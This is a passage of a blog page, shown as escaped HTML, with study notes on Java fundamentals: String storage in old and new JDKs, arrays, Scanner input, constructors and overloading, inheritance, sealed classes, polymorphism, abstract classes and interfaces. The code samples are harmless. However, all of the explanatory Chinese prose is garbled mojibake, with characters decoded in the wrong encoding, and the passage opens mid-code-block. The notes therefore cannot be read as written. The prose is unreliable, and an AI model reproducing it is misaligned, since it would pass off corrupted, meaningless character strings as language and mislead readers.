&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">count&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œè¾ƒæ–°çš„JDKç‰ˆæœ¬çš„&lt;code>String&lt;/code>åˆ™ä»¥&lt;code>byte[]&lt;/code>å­˜å‚¨ï¼šå¦‚æžœ&lt;code>String&lt;/code>ä»…åŒ…å«ASCIIå­—ç¬¦ï¼Œåˆ™æ¯ä¸ª&lt;code>byte&lt;/code>å­˜å‚¨ä¸€ä¸ªå­—ç¬¦ï¼Œå¦åˆ™ï¼Œæ¯ä¸¤ä¸ª&lt;code>byte&lt;/code>å­˜å‚¨ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œå› ä¸ºå¤§é‡çš„é•¿åº¦è¾ƒçŸ­çš„&lt;code>String&lt;/code>é€šå¸¸ä»…åŒ…å«ASCIIå­—ç¬¦&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">String&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">coder&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 0 = LATIN1, 1 = UTF16
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹äºŽä½¿ç”¨è€…æ¥è¯´ï¼Œ&lt;code>String&lt;/code>å†…éƒ¨çš„ä¼˜åŒ–ä¸å½±å“ä»»ä½•å·²æœ‰ä»£ç ï¼Œå› ä¸ºå®ƒçš„&lt;code>public&lt;/code>æ–¹æ³•ç­¾åæ˜¯ä¸å˜çš„&lt;/p>
&lt;h3 id="æ•°ç»„">æ•°ç»„&lt;/h3>
&lt;ul>
&lt;li>æ–°å»ºæ•°ç»„&lt;code>int[] n = new int[5];&lt;/code>ï¼Œå¤§å°ä¸å¯å˜ï¼Œä¸ºå¼•ç”¨ç±»åž‹&lt;/li>
&lt;li>å¯¹äºŽæ•°ç»„å…ƒç´ ï¼ˆæˆ–æ‰€æœ‰å¯è¿­ä»£çš„æ•°æ®ç±»åž‹ï¼‰çš„éåŽ†ç›´æŽ¥ä½¿ç”¨&lt;code>for(int n:na){}&lt;/code>ï¼Œç¼ºç‚¹æ˜¯æ— æ³•æŒ‡å®šéåŽ†é¡ºåºï¼Œæ— æ³•èŽ·å–æ•°ç»„ç´¢å¼•ï¼ˆnç›´æŽ¥ä»£è¡¨å…ƒç´ ï¼‰&lt;/li>
&lt;li>å¿«é€Ÿæ‰“å°æ•°ç»„å†…å®¹&lt;code>System.out.println(Arrays.toString(ns));&lt;/code>&lt;/li>
&lt;li>å¿«é€Ÿæ‰“å°äºŒç»´æ•°ç»„å†…å®¹&lt;code>System.out.println(Arrays.deepToString(ns));&lt;/code>&lt;/li>
&lt;li>å¯å˜å‚æ•°ç”¨&lt;code>ç±»åž‹...&lt;/code>å®šä¹‰ï¼Œå¯å˜å‚æ•°ç›¸å½“äºŽæ•°ç»„ç±»åž‹&lt;/li>
&lt;/ul>
&lt;h3 id="æµç¨‹æŽ§åˆ¶">æµç¨‹æŽ§åˆ¶&lt;/h3>
&lt;ul>
&lt;li>è¯»å–è¾“å…¥éœ€è¦&lt;code>import java.util.Scanner&lt;/code>ï¼Œç”±&lt;code>Scanner&lt;/code>å¯¹è±¡è¿›è¡Œè¯»å…¥æ“ä½œ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Scanner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">scanner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">in&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input your name: &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input your age: &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hi, %s, you are %d\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>switchè¯­å¥ä¸è¦å¿˜breakï¼Œcaseä¸ç”¨èŠ±æ‹¬å·&lt;/li>
&lt;li>&lt;code>default&lt;/code>è¯­å¥ï¼Œå¯ä»¥åœ¨æ¼å†™æŸä¸ªæžšä¸¾å¸¸é‡æ—¶è‡ªåŠ¨æŠ¥é”™ï¼Œä»Žè€ŒåŠæ—¶å‘çŽ°é”™è¯¯&lt;/li>
&lt;/ul>
&lt;h2 id="oopåŸºç¡€">OOPåŸºç¡€&lt;/h2>
&lt;h3 id="ç±»å®žä¾‹">ç±»&amp;amp;å®žä¾‹&lt;/h3>
&lt;ul>
&lt;li>å¯¹è±¡é new&lt;/li>
&lt;li>ä¸€ä¸ªjavaæºæ–‡ä»¶å¯ä»¥åŒ…å«å¤šä¸ªç±»çš„å®šä¹‰ï¼Œä½†åªèƒ½å®šä¹‰ä¸€ä¸ªpublicç±»ï¼Œä¸”publicç±»åå¿…é¡»ä¸Žæ–‡ä»¶åä¸€è‡´ï¼›å¦‚æžœè¦å®šä¹‰å¤šä¸ªpublicç±»ï¼Œå¿…é¡»æ‹†åˆ°å¤šä¸ªJavaæºæ–‡ä»¶ä¸­&lt;/li>
&lt;/ul>
&lt;h3 id="æ–¹æ³•">æ–¹æ³•&lt;/h3>
&lt;ul>
&lt;li>è¯­æ³•&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>ä¿®é¥°ç¬¦ æ–¹æ³•è¿”å›žç±»åž‹ æ–¹æ³•å(æ–¹æ³•å‚æ•°åˆ—è¡¨) {
è‹¥å¹²æ–¹æ³•è¯­å¥;
return æ–¹æ³•è¿”å›žå€¼;
}
// æ— return è¿”å›žç±»åž‹ä¸ºvoid
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>å˜é‡è®¾ä¸ºprivateåŽå¯ä»¥é€šè¿‡publicå¯¹å¤–çš„æ–¹æ³•é—´æŽ¥ä¿®æ”¹&lt;/li>
&lt;li>æ²¡äº‹å„¿å°±å°½å¯èƒ½å°‘ç”¨publicï¼Œå°‘æš´éœ²å¯¹å¤–çš„æ–¹æ³•&lt;/li>
&lt;li>ä¸Žç±»åç›¸åŒçš„æ–¹æ³•ä½œä¸ºconstructæž„é€ æ–¹æ³•ï¼Œæ— è¿”å›žå€¼&lt;/li>
&lt;li>å…ˆåˆå§‹åŒ–å­—æ®µï¼Œå†æ‰§è¡Œæž„é€ æ–¹æ³•ï¼ˆå¯è¦†ç›–å‰é¢çš„&lt;/li>
&lt;li>å¯å®šä¹‰å¤šä¸ªæž„é€ æ–¹æ³•ï¼ˆä¼ å…¥å‚æ•°ç±»åž‹ æ•°é‡ä¸åŒï¼‰ï¼Œnewæ—¶ä¼šè‡ªåŠ¨åŒ¹é…ï¼›ä¸€ä¸ªæž„é€ æ–¹æ³•å¯ä»¥è°ƒç”¨å…¶ä»–æž„é€ æ–¹æ³•ï¼ˆä¾¿äºŽä»£ç å¤ç”¨ï¼‰ï¼Œè¯­æ³•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">18&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨å¦ä¸€ä¸ªæž„é€ æ–¹æ³•Person(String, int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Unnamed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨å¦ä¸€ä¸ªæž„é€ æ–¹æ³•Person(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>éžæž„é€ æ–¹æ³•ä¹Ÿå¯æœ‰å¤šä¸ªé‡åçš„ï¼ˆå‚æ•°ä¸åŒ è¿”å›žå€¼é€šå¸¸ç›¸åŒï¼‰ï¼Œç§°ä¸ºæ–¹æ³•é‡è½½(Overload)ï¼Œä¾¿äºŽç”¨ä¸€ä¸ªåå­—å¤„ç†å¤šç§å‚æ•°è¾“å…¥&lt;/li>
&lt;/ul>
&lt;h3 id="ç»§æ‰¿å¤šæ€">ç»§æ‰¿&amp;amp;å¤šæ€&lt;/h3>
&lt;ul>
&lt;li>ä½¿ç”¨&lt;code>extends&lt;/code>å…³é”®å­—ï¼Œä¾‹&lt;code>class Student extends Person&lt;/code>&lt;/li>
&lt;li>subclass == extended class; super class == parent class == base class&lt;/li>
&lt;li>å­ç±»ä¸å¯è®¿é—®çˆ¶ç±»çš„&lt;code>private&lt;/code>å­—æ®µå’Œæ–¹æ³•ï¼Œä¸èƒ½è¦†å†™çˆ¶ç±»å¸¦æœ‰&lt;code>final&lt;/code>å…³é”®å­—çš„æ–¹æ³•ï¼Œä¸èƒ½ç»§æ‰¿å¸¦æœ‰&lt;code>final&lt;/code>çš„ç±»ï¼Œä¸èƒ½é‡æ–°èµ‹å€¼å¸¦æœ‰&lt;code>final&lt;/code>çš„å­—æ®µ&lt;/li>
&lt;li>&lt;code>private&lt;/code>è®¿é—®æƒé™è¢«é™å®šåœ¨&lt;code>class&lt;/code>çš„å†…éƒ¨ï¼Œè€Œä¸”ä¸Žæ–¹æ³•å£°æ˜Žé¡ºåºæ— å…³ï¼›å¦‚æžœä¸€ä¸ªç±»å†…éƒ¨è¿˜å®šä¹‰äº†nested classåµŒå¥—ç±»ï¼Œé‚£ä¹ˆï¼ŒåµŒå¥—ç±»æ‹¥æœ‰è®¿é—®&lt;code>private&lt;/code>çš„æƒé™&lt;/li>
&lt;li>å®šä¹‰ä¸º&lt;code>protected&lt;/code>çš„å­—æ®µå’Œæ–¹æ³•å¯ä»¥è¢«å­ç±»è®¿é—®ï¼Œä»¥åŠå­ç±»çš„å­ç±»&lt;/li>
&lt;li>ç»§æ‰¿ä¹‹åŽ&lt;code>super.name&lt;/code>, &lt;code>this.name&lt;/code>, &lt;code>name&lt;/code>éƒ½æ˜¯ä¸€ä¸ªæ„æ€ï¼Œä½†å¦‚æžœå­˜åœ¨æ–¹æ³•è¦†å†™åŽè°ƒç”¨çˆ¶ç±»æ–¹æ³•å°±å¿…é¡»ç”¨&lt;code>super.name&lt;/code>ï¼ˆè”æƒ³NodeJSçš„&lt;code>.call&lt;/code>, &lt;code>.apply&lt;/code> å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼‰&lt;/li>
&lt;li>æœªæ³¨æ˜Ž&lt;code>extends xxx&lt;/code>çš„ç±»è‡ªåŠ¨è¢«è¡¥ä¸Šäº†&lt;code>extends Object&lt;/code>ï¼Œæœ€é¡¶å±‚çš„&lt;code>object&lt;/code>ä¹Ÿæ˜¯å¯ä»¥è¢«è¦†å†™çš„&lt;/li>
&lt;li>ä»»ä½•ç±»çš„æž„é€ æ–¹æ³•ä¸­ç¬¬ä¸€è¡Œè¯­å¥å¿…é¡»æ˜¯è°ƒç”¨çˆ¶ç±»çš„æž„é€ æ–¹æ³•ï¼Œå¦‚æœªæ³¨æ˜Žä¼šè‡ªåŠ¨è¡¥ä¸Š&lt;code>super();&lt;/code>ï¼Œæ‰€ä»¥å¦‚æžœçˆ¶ç±»æ²¡æœ‰é»˜è®¤çš„æž„é€ æ–¹æ³•ï¼Œå­ç±»å°±å¿…é¡»æ˜¾å¼è°ƒç”¨&lt;code>super()&lt;/code>å¹¶ç»™å‡ºå‚æ•°ä»¥ä¾¿è®©ç¼–è¯‘å™¨å®šä½åˆ°çˆ¶ç±»çš„ä¸€ä¸ªåˆé€‚çš„æž„é€ æ–¹æ³•â€”â€”â€”â€”ä¸€å¥è¯ï¼šå­ç±»ä¸ç»§æ‰¿çˆ¶ç±»çš„æž„é€ æ–¹æ³•ï¼Œæ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼ˆè”æƒ³Nodejsæ‰§è¡Œä»£ç æ—¶çš„wrapperï¼‰&lt;/li>
&lt;li>Java15ä¹‹åŽå…è®¸&lt;code>sealed&lt;/code>ä¿®é¥°classï¼Œå¹¶å¯é€šè¿‡&lt;code>permits&lt;/code>é™åˆ¶èƒ½ä»Žè¯¥ç±»ç»§æ‰¿çš„å­ç±»åç§°ï¼ˆç›®å‰ä¸ºé¢„è§ˆçŠ¶æ€ï¼Œå¯å¼€å¯&lt;code>--enable-preview&lt;/code>å’Œ&lt;code>--source 15&lt;/code>å¼€å¯ï¼‰&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">sealed&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Shape&lt;/span> &lt;span style="color:#111">permits&lt;/span> &lt;span style="color:#111">Rect&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Circle&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Triangle&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// xxx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å‘ä¸Šè½¬åž‹åŸºæœ¬æ— é—®é¢˜ï¼Œå‘ä¸‹å¯èƒ½å›žæŠ¥ClassCastExceptionçš„é”™è¯¯ï¼Œç”¨&lt;code>instanceof&lt;/code>åˆ¤æ–­ä¸€ä¸ªå®žä¾‹ç©¶ç«Ÿæ˜¯ä¸æ˜¯æŸç§ç±»åž‹&lt;/li>
&lt;li>å­ç±»ä¸Žçˆ¶ç±»æ–¹æ³•ç­¾åå®Œå…¨ç›¸åŒæ—¶å¯è¦†å†™(Override)ï¼ŒåŠ ä¸Š&lt;code>@Override&lt;/code>å¯ä»¥è®©ç¼–è¯‘å™¨å¸®åŠ©æ£€æŸ¥æ˜¯å¦è¿›è¡Œäº†æ­£ç¡®çš„è¦†å†™ï¼ˆéžå¿…è¦ï¼‰&lt;/li>
&lt;li>newæ¥çš„å¯¹è±¡å¦‚æžœæŒ‡å®šçš„ç±»åž‹ä¸åŒï¼Œå®žé™…è°ƒç”¨å…¶æ–¹æ³•æ—¶ä¼šä¸åŒï¼Œrunèµ·æ¥æ‰çŸ¥é“å…·ä½“ç”¨çš„å•¥ï¼Œè¿™ä¸ªå«å¤šæ€(Polymorphic)ï¼Œæœ‰åŠ©äºŽå®žçŽ°åŠŸèƒ½æ‹“å±•ï¼Œå°è£…åº•å±‚é€»è¾‘ ä¼˜åŒ–äº¤äº’&lt;/li>
&lt;/ul>
&lt;h3 id="æŠ½è±¡ç±»æŽ¥å£">æŠ½è±¡ç±»&amp;amp;æŽ¥å£&lt;/h3>
&lt;ul>
&lt;li>æŠ½è±¡ç±»ä¸å®žçŽ°ä»»ä½•åŠŸèƒ½ ä»…ä¸ºäº†å®šä¹‰æ–¹æ³•ç­¾åï¼Œç›®çš„å°±æ˜¯ä¸ºäº†è®©å­ç±»ç»§æ‰¿å¹¶è¦†ç›–ï¼Œæ³¨æ„è¿™ä¸ªç±»æœ¬èº«ä¹Ÿè¦å£°æ˜Žä¸º&lt;code>abstract&lt;/code>ä½œæŠ½è±¡ç±»&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// æ— å­å¥
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å½“æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªæŠ½è±¡ç±»å’ŒNä¸ªå…·ä½“ç±»ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æŠ½è±¡ç±»ä½œå¼•ç”¨ç±»åž‹åŽ»å¼•ç”¨å…·ä½“ç±»çš„å­ç±»å®žä¾‹ï¼Œå¥½å¤„åœ¨äºŽå¯¹å®žä¾‹çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨æ—¶å¹¶ä¸å…³å¿ƒæŠ½è±¡ç±»åž‹å˜é‡çš„å…·ä½“å­ç±»åž‹&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Teacher&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ä¸å…³å¿ƒPersonå˜é‡çš„å…·ä½“å­ç±»åž‹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åŒæ ·ä¸å…³å¿ƒæ–°çš„å­ç±»æ˜¯å¦‚ä½•å®žçŽ°run()æ–¹æ³•çš„ï¼š
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Employee&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ç§å°½é‡å¼•ç”¨é«˜å±‚ç±»åž‹ï¼Œé¿å…å¼•ç”¨å®žé™…å­ç±»åž‹çš„æ–¹å¼ï¼Œç§°ä¹‹ä¸ºé¢å‘æŠ½è±¡ç¼–ç¨‹ï¼Œæœ¬è´¨ï¼š&lt;/p>
&lt;p>ä¸Šå±‚ä»£ç åªå®šä¹‰è§„èŒƒ(&lt;code>abstract class Person&lt;/code>)ï¼Œä¸éœ€è¦å­ç±»å°±å¯ä»¥å®žçŽ°ä¸šåŠ¡é€»è¾‘ï¼ˆæ­£å¸¸ç¼–è¯‘ï¼‰ï¼Œå…·ä½“çš„ä¸šåŠ¡é€»è¾‘ç”±ä¸åŒçš„å­ç±»å®žçŽ°ï¼Œè°ƒç”¨è€…å¹¶ä¸å…³å¿ƒ&lt;/p>
&lt;ul>
&lt;li>&lt;code>interface&lt;/code>æ¯”æŠ½è±¡ç±»è¿˜æŠ½è±¡çš„çº¯æŠ½è±¡æŽ¥å£ï¼Œæ— å®žä¾‹å­—æ®µï¼Œæ‰€æœ‰æ–¹æ³•éƒ½é»˜è®¤&lt;code>public abstract&lt;/code>&lt;/li>
&lt;/ul>
